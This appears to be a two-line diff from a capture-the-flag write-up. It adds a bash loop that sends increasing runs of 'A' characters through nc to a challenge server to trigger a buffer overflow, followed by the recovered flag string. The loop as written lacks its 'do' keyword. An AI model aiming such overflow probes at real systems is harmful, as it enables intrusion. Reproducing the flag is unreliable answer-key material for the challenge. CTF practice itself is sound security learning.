@@ -1,0 +1,2 @@
+ for i in {1..500}; python -c "print('A' * $i + 'flag')" | nc chal.utc-ctf.club 35235; done | grep "utc"
+utc{buffer_0verflows_4re_c00l!}
